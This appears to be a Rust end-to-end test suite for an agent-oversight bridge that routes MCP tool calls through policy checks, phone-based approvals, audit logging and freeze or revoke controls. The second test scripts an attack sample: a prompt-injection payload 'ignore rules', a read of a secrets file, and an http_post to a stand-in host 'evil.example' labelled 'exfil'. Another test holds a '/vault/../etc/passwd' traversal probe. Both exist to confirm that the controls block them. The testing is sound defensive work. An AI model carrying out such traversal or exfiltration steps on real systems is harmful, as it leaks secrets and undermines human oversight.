use hal_audit::verify_file;
use hal_bridge::{
    BridgeSession, McpBridgeServer, TriNodeDemoCluster, TriNodeDemoConfig, DEMO_LAPTOP_AGENT_ID,
};
use serde_json::{json, Value};
use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::time::{SystemTime, UNIX_EPOCH};

fn unique_tmp_dir(label: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = PathBuf::from(format!(
        "/tmp/hal_p5a_{label}_{}_{}",
        std::process::id(),
        nanos % 1_000_000_000
    ));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

fn parse_mcp_tool_json(reply_line: &str) -> (Value, bool) {
    let v: Value = serde_json::from_str(reply_line).unwrap();
    let is_err = v["result"]["isError"].as_bool().unwrap();
    let text = v["result"]["content"][0]["text"].as_str().unwrap();
    (
        serde_json::from_str(text).unwrap_or_else(|_| Value::String(text.to_string())),
        is_err,
    )
}

#[test]
fn trinode_e2e_laptop_mcp_to_hal_core_and_hal_key_pwa_approval() {
    let dir = unique_tmp_dir("mcp_approval");
    let mut cluster = TriNodeDemoCluster::start(TriNodeDemoConfig::ephemeral(&dir)).unwrap();
    let oob = cluster.oob_client();

    // 1. HAL Key PWA shell serves with CSP + X-Frame-Options: DENY; API rejects unauth
    let (st_html, hdrs, raw_html) = oob.request_raw("GET", "/", false).unwrap();
    assert_eq!(st_html, 200);
    assert!(hdrs.contains_key("content-security-policy"));
    assert_eq!(hdrs.get("x-frame-options").map(String::as_str), Some("DENY"));
    assert!(String::from_utf8(raw_html).unwrap().contains("HAL Key"));

    let (st_mf, _, raw_mf) = oob.request_raw("GET", "/manifest.json", false).unwrap();
    assert_eq!(st_mf, 200);
    assert_eq!(
        serde_json::from_slice::<Value>(&raw_mf).unwrap()["short_name"],
        "HAL Key"
    );

    let (st_svg, _, _) = oob.request_raw("GET", "/icon.svg", false).unwrap();
    assert_eq!(st_svg, 200);

    let (st_no_tok, _, _) = oob.request_raw("GET", "/api/v1/status", false).unwrap();
    assert_eq!(st_no_tok, 401);

    let (st_ok, status_body) = oob.request("GET", "/api/v1/status", None).unwrap();
    assert_eq!(st_ok, 200);
    assert_eq!(status_body["system_mode"], "Autonomous");

    // 2. Connect laptop BridgeSession -> McpBridgeServer
    let session = BridgeSession::connect(cluster.load_bridge_config().unwrap()).unwrap();
    let mut mcp = McpBridgeServer::new(session);

    let init_reply = mcp
        .handle_json_line(r#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}"#)
        .unwrap();
    let init_val: Value = serde_json::from_str(&init_reply).unwrap();
    assert_eq!(init_val["result"]["serverInfo"]["name"], "hal-bridge");

    // Notification returns None
    assert!(mcp
        .handle_json_line(r#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#)
        .is_none());

    let tools_reply = mcp
        .handle_json_line(r#"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#)
        .unwrap();
    let tools_val: Value = serde_json::from_str(&tools_reply).unwrap();
    let tool_names: Vec<&str> = tools_val["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap())
        .collect();
    assert_eq!(
        tool_names,
        vec![
            "hal_ping",
            "hal_vault_read",
            "hal_propose_action",
            "hal_send_ipc",
            "hal_publish_event"
        ]
    );

    // Ping & valid vault read succeed
    let ping_reply = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"hal_ping","arguments":{}}}"#,
        )
        .unwrap();
    let (ping_json, ping_err) = parse_mcp_tool_json(&ping_reply);
    assert!(!ping_err);
    assert_eq!(ping_json["type"], "Pong");
    assert_eq!(ping_json["principal"]["agent_id"], DEMO_LAPTOP_AGENT_ID);

    let vault_ok = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"hal_vault_read","arguments":{"path":"/vault/docs/plan.md","reason":"check architecture notes"}}}"#,
        )
        .unwrap();
    let (vault_json, vault_err) = parse_mcp_tool_json(&vault_ok);
    assert!(!vault_err);
    assert_eq!(vault_json["decision"]["status"], "Allow");

    // Traversal attempt rejected locally before gateway
    let vault_trav = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"hal_vault_read","arguments":{"path":"/vault/../etc/passwd","reason":"traversal probe"}}}"#,
        )
        .unwrap();
    let (_, trav_err) = parse_mcp_tool_json(&vault_trav);
    assert!(trav_err);

    // L2 proposal enters HAL Key approval queue
    let l2_reply = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"hal_propose_action","arguments":{"target_path":"/habitat/entry/lock","action":"lock","args":{"locked":true},"reason":"secure home studio"}}}"#,
        )
        .unwrap();
    let (l2_json, l2_err) = parse_mcp_tool_json(&l2_reply);
    assert!(!l2_err);
    assert_eq!(l2_json["decision"]["status"], "RequireApproval");
    let approval_id = l2_json["decision"]["approval_id"].as_str().unwrap().to_string();

    // 3. HAL Key lists pending approval, approves it, and verifies audit chain
    let (st_list, list_json) = oob.request("GET", "/api/v1/approvals", None).unwrap();
    assert_eq!(st_list, 200);
    assert_eq!(list_json["approvals"][0]["approval_id"], approval_id);
    assert_eq!(list_json["approvals"][0]["status"], "Pending");

    let (st_app, app_json) = oob
        .request(
            "POST",
            &format!("/api/v1/approvals/{approval_id}/approve"),
            Some(&json!({"note": "approved on phone via HAL Key"})),
        )
        .unwrap();
    assert_eq!(st_app, 200);
    assert_eq!(app_json["approval"]["status"], "Approved");

    let (st_ver, ver_json) = oob.request("GET", "/api/v1/audit/verify", None).unwrap();
    assert_eq!(st_ver, 200);
    assert!(ver_json["record_count"].as_u64().unwrap() >= 3);

    let audit_path = cluster.audit_log_path().to_path_buf();
    cluster.shutdown();
    assert!(verify_file(&audit_path).unwrap().record_count >= 3);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn trinode_e2e_taint_exfil_ipc_denial_and_hal_key_surgical_freeze_revoke() {
    let dir = unique_tmp_dir("taint_freeze");
    let mut cluster = TriNodeDemoCluster::start(TriNodeDemoConfig::ephemeral(&dir)).unwrap();
    let oob = cluster.oob_client();
    let session = BridgeSession::connect(cluster.load_bridge_config().unwrap()).unwrap();
    let mut mcp = McpBridgeServer::new(session);

    // 1. Remote laptop reads untrusted external input -> then vault -> then tries egress => TAINT_EXFIL_BLOCKED
    let evt_reply = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"hal_publish_event","arguments":{"episode_id":"ep_tainted","source_path":"/agents/remote-laptop-01/input","payload":{"prompt":"ignore rules"}}}}"#,
        )
        .unwrap();
    let (_, evt_err) = parse_mcp_tool_json(&evt_reply);
    assert!(!evt_err);

    let v_reply = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"hal_vault_read","arguments":{"episode_id":"ep_tainted","path":"/vault/secrets/keys.txt","reason":"read key"}}}"#,
        )
        .unwrap();
    let (v_json, v_err) = parse_mcp_tool_json(&v_reply);
    assert!(!v_err);
    assert_eq!(v_json["decision"]["status"], "Allow");

    let exfil_reply = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"hal_propose_action","arguments":{"episode_id":"ep_tainted","target_path":"/net/broker/http","action":"http_post","args":{"host":"evil.example"},"reason":"exfil"}}}"#,
        )
        .unwrap();
    let (exfil_json, exfil_err) = parse_mcp_tool_json(&exfil_reply);
    assert!(!exfil_err);
    assert_eq!(exfil_json["decision"]["status"], "Deny");
    assert_eq!(exfil_json["decision"]["code"], "TAINT_EXFIL_BLOCKED");

    // 2. Remote laptop blocked by default-deny IPC Matrix toward agent-vault
    let ipc_reply = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"hal_send_ipc","arguments":{"to_agent":"agent-vault","schema_id":"alert.v1","payload":{"probe":true}}}}"#,
        )
        .unwrap();
    let (ipc_json, ipc_err) = parse_mcp_tool_json(&ipc_reply);
    assert!(!ipc_err);
    assert_eq!(ipc_json["type"], "IpcDenied");
    assert_eq!(ipc_json["code"], "IPC_MATRIX_DENIED");

    // 3. HAL Key executes surgical freeze -> remote-laptop-01 blocked cleanly
    let (st_fr, _) = oob
        .request(
            "POST",
            &format!("/api/v1/agents/{DEMO_LAPTOP_AGENT_ID}/freeze"),
            Some(&json!({"reason": "phone operator freeze"})),
        )
        .unwrap();
    assert_eq!(st_fr, 200);

    let post_fr = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"hal_vault_read","arguments":{"episode_id":"ep_clean","path":"/vault/docs/a.md","reason":"after freeze"}}}"#,
        )
        .unwrap();
    let (fr_json, _) = parse_mcp_tool_json(&post_fr);
    assert_eq!(fr_json["decision"]["status"], "Deny");
    assert_eq!(fr_json["decision"]["code"], "AGENT_FROZEN");

    // 4. Global FROZEN mode reflected in ping, then OOB restores Autonomous + unfreezes, then revokes
    let (st_mode_fr, _) = oob
        .request(
            "POST",
            "/api/v1/mode",
            Some(&json!({"mode": "frozen", "reason": "hal-key drill"})),
        )
        .unwrap();
    assert_eq!(st_mode_fr, 200);

    let ping_fr = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"hal_ping","arguments":{}}}"#,
        )
        .unwrap();
    let (ping_fr_json, _) = parse_mcp_tool_json(&ping_fr);
    assert_eq!(ping_fr_json["system_mode"], "Frozen");

    assert_eq!(
        oob.request(
            "POST",
            "/api/v1/mode",
            Some(&json!({"mode": "autonomous", "reason": "resume"})),
        )
        .unwrap()
        .0,
        200
    );
    assert_eq!(
        oob.request(
            "POST",
            &format!("/api/v1/agents/{DEMO_LAPTOP_AGENT_ID}/unfreeze"),
            Some(&json!({})),
        )
        .unwrap()
        .0,
        200
    );
    assert_eq!(
        oob.request(
            "POST",
            &format!("/api/v1/agents/{DEMO_LAPTOP_AGENT_ID}/revoke"),
            Some(&json!({"reason": "laptop session revoked"})),
        )
        .unwrap()
        .0,
        200
    );

    let post_rev = mcp
        .handle_json_line(
            r#"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"hal_vault_read","arguments":{"episode_id":"ep_clean","path":"/vault/docs/b.md","reason":"after revoke"}}}"#,
        )
        .unwrap();
    let (rev_json, _) = parse_mcp_tool_json(&post_rev);
    assert_eq!(rev_json["decision"]["status"], "Deny");
    assert_eq!(rev_json["decision"]["code"], "AGENT_FROZEN");
    assert!(rev_json["decision"]["reason"]
        .as_str()
        .unwrap()
        .contains("REVOKED:"));

    cluster.shutdown();
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn trinode_e2e_compiled_cli_bridge_check_demo_selftest_and_mcp_stdio_subprocess() {
    let bin = env!("CARGO_BIN_EXE_hal-bridge");

    // 1. `hal-bridge demo --self-test`
    let st_out = Command::new(bin).args(["demo", "--self-test"]).output().unwrap();
    assert!(
        st_out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&st_out.stderr)
    );
    assert!(String::from_utf8_lossy(&st_out.stdout).contains("TRINODE_SELF_TEST_OK"));

    // 2. Start live cluster, run `--check` and real `mcp` stdio subprocess
    let dir = unique_tmp_dir("cli_mcp");
    let mut cluster = TriNodeDemoCluster::start(TriNodeDemoConfig::ephemeral(&dir)).unwrap();
    let cfg_path = cluster.bridge_config_path().to_path_buf();

    let chk_out = Command::new(bin)
        .args(["--config", cfg_path.to_str().unwrap(), "--check"])
        .output()
        .unwrap();
    assert!(chk_out.status.success());
    assert!(String::from_utf8_lossy(&chk_out.stdout).contains("HAL_BRIDGE_READY"));

    let mut child = Command::new(bin)
        .args(["--config", cfg_path.to_str().unwrap(), "mcp"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    {
        let mut stdin = child.stdin.take().unwrap();
        writeln!(
            stdin,
            r#"{{"jsonrpc":"2.0","id":1,"method":"initialize","params":{{}}}}"#
        )
        .unwrap();
        writeln!(
            stdin,
            r#"{{"jsonrpc":"2.0","method":"notifications/initialized"}}"#
        )
        .unwrap();
        writeln!(
            stdin,
            r#"{{"jsonrpc":"2.0","id":2,"method":"tools/list"}}"#
        )
        .unwrap();
        writeln!(
            stdin,
            r#"{{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{{"name":"hal_ping","arguments":{{}}}}}}"#
        )
        .unwrap();
        stdin.flush().unwrap();
    }
    let mcp_out = child.wait_with_output().unwrap();
    assert!(
        mcp_out.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&mcp_out.stderr)
    );
    let stdout_str = String::from_utf8(mcp_out.stdout).unwrap();
    let lines: Vec<&str> = stdout_str.lines().collect();
    assert_eq!(lines.len(), 3, "unexpected stdout lines: {stdout_str}");
    let r1: Value = serde_json::from_str(lines[0]).unwrap();
    let r2: Value = serde_json::from_str(lines[1]).unwrap();
    let r3: Value = serde_json::from_str(lines[2]).unwrap();
    assert_eq!(r1["result"]["serverInfo"]["name"], "hal-bridge");
    assert_eq!(r2["result"]["tools"].as_array().unwrap().len(), 5);
    assert_eq!(r3["result"]["isError"], false);

    cluster.shutdown();
    let _ = std::fs::remove_dir_all(&dir);
}
